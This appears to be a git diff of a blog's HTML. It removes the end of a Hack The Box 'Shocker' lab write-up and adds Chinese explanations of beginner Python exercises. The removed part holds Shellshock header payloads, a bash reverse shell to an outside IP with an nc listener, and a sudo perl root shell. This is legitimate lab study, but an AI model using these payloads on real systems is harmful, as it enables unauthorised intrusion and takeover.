-<li>() { :;}; echo; /usr/bin/python3 -c ‘import os; os.system(“/bin/ping -c 1 10.129.108.18”)’; /usr/bin/id</li>
-</ul>
-<p><img src="img/shocker_Untitled_22.png" alt="Untitled"></p>
-<p>Now change the proxy to intercept off and execute the namp instruction just now</p>
-<p><img src="img/shocker_Untitled_23.png" alt="Untitled"></p>
-<p>After running the result, go back to burp to see the HTTP history, and you will see that () { :;}; ls is executed, but 500 Internal Server Error is returned</p>
-<p><img src="img/shocker_Untitled_24.png" alt="Untitled"></p>
-<p>Logically speaking, it should not be a 500 response, referring to the previous expoit, I guess it is related to whether there is an echo;</p>
-<p>Sure enough, the response is indeed normal.</p>
-<p><img src="img/shocker_Untitled_25.png" alt="Untitled"></p>
-<ul>
-<li>User-Agent: () { :;}; echo; /bin/ls</li>
-</ul>
-<p><img src="img/shocker_Untitled_26.png" alt="Untitled"></p>
-<p>This is because there will be a blank line between the header and the text. If the line is missing, there will be 500 responses, so add echo;</p>
-<ul>
-<li>User-Agent: () { :;}; echo; /bin/bash -c whoami</li>
-</ul>
-<p><img src="img/shocker_Untitled_27.png" alt="Untitled"></p>
-<p>now use reverse shell cheat sheet</p>
-<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<blockquote>
-<p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
-</blockquote>
-<ul>
-<li>nc -nlvp 4444</li>
-<li>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1</li>
-</ul>
-<p><img src="img/shocker_Untitled_28.png" alt="Untitled"></p>
-<p>Now you can get the flag of general users</p>
-<p><img src="img/shocker_Untitled_29.png" alt="Untitled"></p>
-<ul>
-<li>sudo -l to see What the current user has permission to do</li>
-</ul>
-<p>User shelly may run the following commands on Shocker:</p>
-<blockquote>
-<p>(root) NOPASSWD: /usr/bin/perl</p>
-</blockquote>
-<p><img src="img/shocker_Untitled_30.png" alt="Untitled"></p>
-<ul>
-<li><p>sudo perl -e ‘exec(“/bin/sh -i”)’</p>
-<p>  <img src="img/shocker_Untitled_31.png" alt="Untitled"></p>
 </li>
-<li><p>find / -name root.txt</p>
+<li><strong>內層迴圈</strong> <code>for j in range(1, n + 1)</code>：<ul>
+<li>對於每個 <code>i</code> 的值，<code>j</code> 從 <code>1</code> 到 <code>3</code>，依次執行程式。</li>
+<li>每次內層迴圈執行時，都會計算 <code>i * j</code>，並顯示乘法表格的一部分。</li>
+</ul>
+</li>
+</ol>
+<h4 id="更詳細的運作流程"><a href="#更詳細的運作流程" class="headerlink" title="更詳細的運作流程"></a>更詳細的運作流程</h4><p>當 <code>n = 3</code> 時，執行的過程如下：</p>
+<ol>
+<li><p><strong>當 <code>i = 1</code> 時</strong>：</p>
+<ul>
+<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
+<li>當 <code>j = 1</code>：計算 <code>1 * 1 = 1</code>，輸出 <code>1 * 1 = 1</code>。</li>
+<li>當 <code>j = 2</code>：計算 <code>2 * 1 = 2</code>，輸出 <code>2 * 1 = 2</code>。</li>
+<li>當 <code>j = 3</code>：計算 <code>3 * 1 = 3</code>，輸出 <code>3 * 1 = 3</code>。</li>
+</ul>
+</li>
+<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第一行。</li>
+<li>第一行輸出結果：<code>1 * 1 = 1   2 * 1 = 2   3 * 1 = 3</code>。</li>
+</ul>
+</li>
+<li><p><strong>當 <code>i = 2</code> 時</strong>：</p>
+<ul>
+<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
+<li>當 <code>j = 1</code>：計算 <code>1 * 2 = 2</code>，輸出 <code>1 * 2 = 2</code>。</li>
+<li>當 <code>j = 2</code>：計算 <code>2 * 2 = 4</code>，輸出 <code>2 * 2 = 4</code>。</li>
+<li>當 <code>j = 3</code>：計算 <code>3 * 2 = 6</code>，輸出 <code>3 * 2 = 6</code>。</li>
+</ul>
+</li>
+<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第二行。</li>
+<li>第二行輸出結果：<code>1 * 2 = 2   2 * 2 = 4   3 * 2 = 6</code>。</li>
+</ul>
+</li>
+<li><p><strong>當 <code>i = 3</code> 時</strong>：</p>
+<ul>
+<li>進入內層迴圈，<code>j</code> 從 <code>1</code> 到 <code>3</code>。<ul>
+<li>當 <code>j = 1</code>：計算 <code>1 * 3 = 3</code>，輸出 <code>1 * 3 = 3</code>。</li>
+<li>當 <code>j = 2</code>：計算 <code>2 * 3 = 6</code>，輸出 <code>2 * 3 = 6</code>。</li>
+<li>當 <code>j = 3</code>：計算 <code>3 * 3 = 9</code>，輸出 <code>3 * 3 = 9</code>。</li>
+</ul>
+</li>
+<li>內層迴圈完成，輸出換行 <code>print()</code>，結束第三行。</li>
+<li>第三行輸出結果：<code>1 * 3 = 3   2 * 3 = 6   3 * 3 = 9</code>。</li>
+</ul>
+</li>
+</ol>
+<p>最終輸出會是：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 * 1 = 1   2 * 1 = 2   3 * 1 = 3   </span><br><span class="line">1 * 2 = 2   2 * 2 = 4   3 * 2 = 6   </span><br><span class="line">1 * 3 = 3   2 * 3 = 6   3 * 3 = 9   </span><br></pre></td></tr></table></figure></p>
+<h3 id="解釋-format-j-i-i-j-的部分"><a href="#解釋-format-j-i-i-j-的部分" class="headerlink" title="解釋 format(j, i, (i * j)) 的部分"></a>解釋 <code>format(j, i, (i * j))</code> 的部分</h3><p>在 <code>print(&#39;&#123;&#125; * &#123;&#125; = &#123;:&lt;4&#125;&#39;.format(j, i, (i * j)), end=&#39;&#39;)</code>：</p>
+<ul>
+<li><code>j</code> 和 <code>i</code> 表示當前要計算的乘法因子。</li>
+<li><code>(i * j)</code> 是計算的結果。</li>
+<li><code>&#39;&#123;:&lt;4&#125;&#39;</code> 格式化輸出會讓結果左對齊，占 <code>4</code> 個空間，讓輸出看起來整齊。</li>
+<li><code>end=&#39;&#39;</code> 是為了避免 <code>print()</code> 預設的換行，這樣每次輸出會排在同一行，直到內層迴圈結束後再換行。</li>
+</ul>
+<h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>雙 <code>for</code> 迴圈讓程式可以按照「行」與「列」的結構，輸出一個 <code>n x n</code> 的乘法表。</p>
+<hr>
+<p>設計說明：<br>請使用迴圈敘述撰寫一程式，要求使用者輸入一個數字，此數字代表後面測試資料的數量。每一筆測試資料是一個正整數（由使用者輸入），將此正整數的每位數全部加總起來。</p>
+<p>範例輸入輸出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">98765</span><br><span class="line">Sum of al digits of 98765 is 35</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>這是一種<strong>列表生成式</strong>的寫法，主要用於將每個位數轉換成一個整數並求和。我們逐步來看這段程式碼是如何運作的。</p>
+<h3 id="程式碼分解-1"><a href="#程式碼分解-1" class="headerlink" title="程式碼分解"></a>程式碼分解</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())):</span><br><span class="line">    n = <span class="built_in">str</span>(<span class="built_in">input</span>())  <span class="comment"># 將使用者輸入的測試資料轉為字串，以便逐位處理</span></span><br><span class="line">    a = [<span class="built_in">int</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">str</span>(n))]  <span class="comment"># 將 n 的每一位轉換成整數並存入列表 a</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sum of all digits of &quot;</span> + <span class="built_in">str</span>(n) + <span class="string">&quot; is &quot;</span> + <span class="built_in">str</span>(<span class="built_in">sum</span>(a)))  <span class="comment"># 計算並輸出 a 中所有位數的總和</span></span><br></pre></td></tr></table></figure>
+<h3 id="詳細解釋"><a href="#詳細解釋" class="headerlink" title="詳細解釋"></a>詳細解釋</h3><ol>
+<li><p><strong>外層 <code>for</code> 迴圈</strong>：<code>for i in range(int(input())):</code></p>
+<ul>
+<li><code>int(input())</code> 會先讓使用者輸入一個數字，表示有幾筆測試資料。</li>
+<li>這個 <code>for</code> 迴圈會依次處理每一筆測試資料。</li>
+</ul>
+</li>
+<li><p><strong>輸入測試資料並轉成字串</strong>：<code>n = str(input())</code></p>
+<ul>
+<li>讓使用者輸入一個正整數 <code>n</code>，然後將 <code>n</code> 轉成字串型別。將 <code>n</code> 轉成字串的原因是為了方便逐位處理，例如 <code>123</code> 可以轉為字串 <code>&quot;123&quot;</code>，這樣每一位可以被當成一個字符來處理。</li>
+</ul>
+</li>
+<li><p><strong>列表生成式</strong>：<code>a = [int(j) for j in list(str(n))]</code></p>
+<ul>
+<li>這是整段程式中較難理解的部分。</li>
+<li><strong>逐步解釋這段代碼</strong>：<ul>
+<li><code>str(n)</code>：將 <code>n</code> 轉為字串形式（如果它還不是字串）。</li>
+<li><code>list(str(n))</code>：將字串 <code>&quot;123&quot;</code> 轉為列表 <code>[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]</code>，每個字符都是一個單獨的字元。</li>
+<li><code>[int(j) for j in list(str(n))]</code>：這是一種列表生成式語法，逐一取出字元 <code>j</code> 並將它轉為整數 <code>int(j)</code>，然後存入新的列表 <code>a</code> 中。</li>
+<li>最終，<code>a</code> 會變成一個整數列表，比如對於 <code>&quot;123&quot;</code>，<code>a</code> 會是 <code>[1, 2, 3]</code>。</li>
+</ul>
 </li>
 </ul>
-<p><img src="img/shocker_Untitled_32.png" alt="Untitled"></p>
+</li>
+<li><p><strong>計算位數總和並輸出</strong>：<code>print(&quot;Sum of all digits of &quot; + str(n) + &quot; is &quot; + str(sum(a)))</code></p>
+<ul>
+<li><code>sum(a)</code>：計算列表 <code>a</code> 中所有元素的總和。例如，<code>a = [1, 2, 3]</code>，則 <code>sum(a)</code> 為 <code>1 + 2 + 3 = 6</code>。</li>
+<li><code>print(&quot;Sum of all digits of &quot; + str(n) + &quot; is &quot; + str(sum(a)))</code>：將結果格式化為字符串並輸出，例如 <code>Sum of all digits of 123 is 6</code>。</li>
+</ul>
+</li>
+</ol>
+<h3 id="範例運作流程"><a href="#範例運作流程" class="headerlink" title="範例運作流程"></a>範例運作流程</h3><p>假設輸入的測試數量為 <code>2</code>，接著輸入的兩筆測試資料分別為 <code>123</code> 和 <code>456</code>：</p>
+<ol>
+<li>輸入 <code>2</code>，表示要輸入兩筆測試資料。</li>
+<li><strong>第一筆測試資料</strong>：<ul>
+<li><code>n = 123</code></li>
+<li><code>a = [1, 2, 3]</code>（通過列表生成式將每一位數轉換成整數列表）</li>
+<li><code>sum(a) = 6</code></li>
+<li>輸出結果：<code>Sum of all digits of 123 is 6</code></li>
+</ul>
+</li>
+<li><strong>第二筆測試資料</strong>：<ul>
+<li><code>n = 456</code></li>
+<li><code>a = [4, 5, 6]</code></li>
+<li><code>sum(a) = 15</code></li>
+<li>輸出結果：<code>Sum of all digits of 456 is 15</code></li>
+</ul>
+</li>
+</ol>
+<hr>
+<p>設計說明：</p>
+<p>請撰寫一程式，讓使用者輸入十個整數作為樣本數，輸出眾數（樣本中出現最多次的數字）及其出現的次數。</p>
+<p>提示：假設樣本中只有一個眾數。</p>
+<h3 id="整體程式碼回顧"><a href="#整體程式碼回顧" class="headerlink" title="整體程式碼回顧"></a>整體程式碼回顧</h3><p>目的是讓使用者輸入十個整數，然後找出這些整數中的眾數（出現次數最多的整數）。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">0</span>] * <span class="number">100</span>  <span class="comment"># 創建一個列表，大小為100，用來計數</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 迴圈執行10次，讓使用者輸入10個數字</span></span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;請輸入整數（範圍 0~99）：&#x27;</span>))  <span class="comment"># 讀取使用者輸入的整數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= n &lt; <span class="number">100</span>:  <span class="comment"># 檢查輸入數字是否在範圍內</span></span><br><span class="line">        m[n] += <span class="number">1</span>  <span class="comment"># 如果在範圍內，對應的索引位置加1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出眾數</span></span><br><span class="line">mode_count = <span class="built_in">max</span>(m)  <span class="comment"># 取得最大出現次數</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  <span class="comment"># 檢查所有可能的整數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(m) == m[i]:  <span class="comment"># 如果該整數的出現次數等於最大出現次數</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;眾數是: <span class="subst">&#123;i&#125;</span>&#x27;</span>)  <span class="comment"># 輸出該整數</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;眾數出現的次數: <span class="subst">&#123;mode_count&#125;</span>&#x27;</span>)  <span class="comment"># 輸出眾數的出現次數</span></span><br></pre></td></tr></table></figure>
+<h3 id="步驟解析"><a href="#步驟解析" class="headerlink" title="步驟解析"></a>步驟解析</h3><ol>
+<li><p><strong>創建列表</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">0</span>] * <span class="number">100</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>這行創建一個包含 100 個元素的列表 <code>m</code>，所有元素都初始化為 0。</li>
+<li>這個列表的索引 <code>0</code> 到 <code>99</code> 會用來代表這些整數的值（因為整數範圍是 0 到 99），而每個索引的位置存儲的是該數字出現的次數。</li>
+</ul>
+</li>
+<li><p><strong>輸入整數</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;請輸入整數（範圍 0~99）：&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>這個迴圈會執行 10 次，讓使用者輸入十個整數。</li>
+</ul>
+</li>
+<li><p><strong>檢查範圍並計數</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt;= n &lt; <span class="number">100</span>:</span><br><span class="line">    m[n] += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>檢查輸入的整數 <code>n</code> 是否在有效範圍內（0 到 99）。</li>
+<li>如果有效，則對應的 <code>m[n]</code> 索引的值會加 1，這表示這個整數出現了一次。</li>
+</ul>
+</li>
+</ol>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假設使用者依序輸入了以下整數：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">1</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>初始時，列表 <code>m</code> 是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ..., 0]  # 0 到 99 都是 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>當使用者輸入每個數字後，列表 <code>m</code> 將如下更新：</p>
+<ol>
+<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 1。</li>
+<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 2。</li>
+<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 1。</li>
+<li>輸入 <code>7</code>：<code>m[7] += 1</code> → <code>m[7]</code> 變成 1。</li>
+<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 3。</li>
+<li>輸入 <code>2</code>：<code>m[2] += 1</code> → <code>m[2]</code> 變成 1。</li>
+<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 2。</li>
+<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 3。</li>
+<li>輸入 <code>1</code>：<code>m[1] += 1</code> → <code>m[1]</code> 變成 1。</li>
+<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 4。</li>
+</ol>
+</li>
+<li><p>最後，列表 <code>m</code> 會是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = [0, 1, 1, 4, 0, 3, 0, 1, 0, ..., 0]  # m[3] = 4，m[5] = 3，其他為 0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="找到眾數"><a href="#找到眾數" class="headerlink" title="找到眾數"></a>找到眾數</h3><ol>
+<li><p><strong>尋找眾數</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mode_count = <span class="built_in">max</span>(m)  <span class="comment"># 找到出現次數的最大值</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>mode_count</code> 現在會是 <code>4</code>，因為 <code>m[3]</code> 是出現次數最多的。</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li><p><strong>輸出眾數</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(m) == m[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;眾數是: <span class="subst">&#123;i&#125;</span>&#x27;</span>)  <span class="comment"># 如果出現次數等於最大出現次數，則打印該數</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>這個迴圈會檢查每個整數（從 0 到 99）：</p>
+<ul>
+<li>當 <code>i = 3</code> 時，因為 <code>m[3]</code> 是 <code>4</code>，所以打印 <code>3</code>。</li>
+</ul>
+</li>
+<li><p>結果是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">眾數是: 3</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="總結-1"><a href="#總結-1" class="headerlink" title="總結"></a>總結</h3><ul>
+<li>我們使用列表 <code>m</code> 來統計每個整數出現的次數，透過列表的索引來直接對應整數的值。</li>
+<li>使用 <code>max(m)</code> 找到出現最多的次數，再用迴圈找出對應的整數，這就是我們的眾數。</li>
+</ul>
+<hr>
+<p>設計說明：</p>
+<p>請撰寫一程式，輸入並建立兩組數組，各以-9999為結束點（數組中不包含-9999）。將此兩數組合併並從小到大排序之，顯示排序前的數組和排序後的串列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">tuple1 = ()</span><br><span class="line">num = eval(input(&#x27;Create tuple1:\n&#x27;))</span><br><span class="line">while num !=-9999:</span><br><span class="line">    tuple1 +=(num,)</span><br><span class="line">    num = eval(input())</span><br><span class="line">tuple2 = ()</span><br><span class="line">num = eval(input(&#x27;Create tuple2:\n&#x27;))</span><br><span class="line">while num !=-9999:</span><br><span class="line">    tuple2 +=(num,)</span><br><span class="line">    num = eval(input())</span><br><span class="line">tuple1 += tuple2</span><br><span class="line">print(&#x27;Combined tuple before sorting:&#x27;,tuple1)</span><br><span class="line">LIST = list(tuple1)</span><br><span class="line">LIST.sort()</span><br><span class="line">print(&#x27;Combined list after sorting:&#x27;,LIST)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="逐步解釋"><a href="#逐步解釋" class="headerlink" title="逐步解釋"></a>逐步解釋</h3><ol>
+<li><p><strong>初始化元組</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 = ()</span><br></pre></td></tr></table></figure>
+<p>這行程式碼初始化了一個空的元組 <code>tuple1</code>。元組是一種不可變的數據結構，這意味著一旦創建後，就不能更改其中的內容。</p>
+</li>
+<li><p><strong>輸入和建立第一組數組</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple1:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num !=-<span class="number">9999</span>:</span><br><span class="line">    tuple1 +=(num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>輸入數值</strong>：使用 <code>input()</code> 函數讓使用者輸入數值，並使用 <code>eval()</code> 將輸入的字符串轉換為數值（整數或浮點數）。</li>
+<li><strong>迴圈結束條件</strong>：<code>while num != -9999:</code> 確保使用者可以不斷輸入數字，直到輸入 <code>-9999</code> 為止。</li>
+<li><strong>元組的拼接</strong>：<code>tuple1 += (num,)</code> 這行程式碼將輸入的數字作為一個單元素的元組進行拼接。這是元組添加元素的方式，因為元組是不可變的，你無法直接改變它的內容，因此需要創建一個新的元組來包含新元素。</li>
+</ul>
+</li>
+<li><p><strong>輸入和建立第二組數組</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple2 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple2:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num !=-<span class="number">9999</span>:</span><br><span class="line">    tuple2 +=(num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
+<p>這部分程式碼與第一組數組的建立非常相似，目的是創建第二個元組 <code>tuple2</code>，使用者輸入的數值也在 <code>-9999</code> 之前。</p>
+</li>
+<li><p><strong>合併兩個元組</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 += tuple2</span><br></pre></td></tr></table></figure>
+<p>這行程式碼將 <code>tuple2</code> 合併到 <code>tuple1</code> 中，創建了一個包含兩組數據的元組。</p>
+</li>
+<li><p><strong>顯示合併前的元組</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined tuple before sorting:&#x27;</span>, tuple1)</span><br></pre></td></tr></table></figure>
+<p>在進行排序之前，將合併後的元組輸出顯示。</p>
+</li>
+<li><p><strong>將元組轉換為列表並排序</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br><span class="line">LIST.sort()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>轉換為列表</strong>：<code>list(tuple1)</code> 將元組轉換為可變的列表，這樣可以進行排序等操作。</li>
+<li><strong>排序</strong>：<code>LIST.sort()</code> 將列表中的元素從小到大排序。</li>
+</ul>
+</li>
+<li><p><strong>顯示排序後的列表</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure>
+<p>最後，將排序後的列表顯示出來。</p>
+</li>
+</ol>
+<ul>
+<li>題外話</li>
+</ul>
+<p>要將合併的元組中的元素從大到小排序，你只需在排序時指定參數 <code>reverse=True</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化第一組元組</span></span><br><span class="line">tuple1 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple1:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num != -<span class="number">9999</span>:</span><br><span class="line">    tuple1 += (num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化第二組元組</span></span><br><span class="line">tuple2 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple2:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num != -<span class="number">9999</span>:</span><br><span class="line">    tuple2 += (num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合併兩個元組</span></span><br><span class="line">tuple1 += tuple2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示合併前的元組</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined tuple before sorting:&#x27;</span>, tuple1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將元組轉換為列表並排序（從大到小）</span></span><br><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br><span class="line">LIST.sort(reverse=<span class="literal">True</span>)  <span class="comment"># 設定 reverse=True 來從大到小排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示排序後的列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p><strong>將元組轉換為列表</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br></pre></td></tr></table></figure>
+<p>將合併的元組轉換為可變的列表，以便可以進行排序。</p>
+</li>
+<li><p><strong>排序列表</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST.sort(reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在這裡，<code>sort()</code> 方法的 <code>reverse=True</code> 參數告訴 Python 將列表按降序（從大到小）進行排序。</li>
+</ul>
+</li>
+<li><p><strong>顯示結果</strong>：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="範例輸入輸出"><a href="#範例輸入輸出" class="headerlink" title="範例輸入輸出"></a>範例輸入輸出</h3><p>如果使用者的輸入是：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Create tuple1:</span><br><span class="line">5</span><br><span class="line">10</span><br><span class="line">3</span><br><span class="line">-9999</span><br><span class="line">Create tuple2:</span><br><span class="line">8</span><br><span class="line">2</span><br><span class="line">-9999</span><br></pre></td></tr></table></figure></p>
+<p>則合併後的元組會是 <code>(5, 10, 3, 8, 2)</code>，排序後的列表將顯示為：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Combined list after sorting: [10, 8, 5, 3, 2]</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -450,7 +683,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>先確認該機器可以連到網路，VM記得切NAT</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 8.8.8.8</span><br></pre></td></tr></table></figure>
-<p><img src="img/scann_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/scann_Untitled.png" alt="Untitled"></p>
 <p>這台機器無法透過  <code>ifconfig</code> 或 <code>ip a</code> 知道IP，要透過kali去找</p>
 <ul>
 <li>ARP的運作原理<ul>
@@ -469,7 +702,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>到目標kioptrix右鍵點選Setting &gt; Network Adapter <code>NAT</code> &gt; Advanced</li>
 <li>找到目標機器的MAC Address</li>
 </ul>
-<p><img src="img/scann_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/scann_Untitled_1.png" alt="Untitled"></p>
 <ul>
 <li>根據剛kali掃描結果比對目標的IP位置</li>
 <li>kioptrix → 192.168.19.140  <em>**</em></li>
@@ -561,9 +794,9 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </li>
 </ul>
 <h3 id="Enumerating-HTTP-and-HTTPS"><a href="#Enumerating-HTTP-and-HTTPS" class="headerlink" title="Enumerating HTTP and HTTPS"></a><strong>Enumerating HTTP and HTTPS</strong></h3><p>因為有看到80/443 port 開啟，可以先訪問該網站</p>
-<p><img src="img/scann_Untitled_2.png" alt="HTTP"></p>
+<p><img src="/img/scann_Untitled_2.png" alt="HTTP"></p>
 <p>HTTP</p>
-<p><img src="img/scann_Untitled_3.png" alt="HTTPS"></p>
+<p><img src="/img/scann_Untitled_3.png" alt="HTTPS"></p>
 <p>HTTPS</p>
 <p>默認網頁</p>
 <ul>
@@ -572,7 +805,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>該網頁後是否還有其他目錄/網頁..</li>
 </ul>
 <p>可以隨手紀錄攻擊時間、目標IP、發現情況..</p>
-<p><img src="img/scann_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/scann_Untitled_4.png" alt="Untitled"></p>
 <ul>
 <li><p>nikto 網路掃描器</p>
 <ul>
@@ -589,7 +822,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>gobuster</li>
 <li><p>dirbuster/dirb</p>
-<p>  <img src="img/scann_Untitled_5.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_5.png" alt="Untitled"></p>
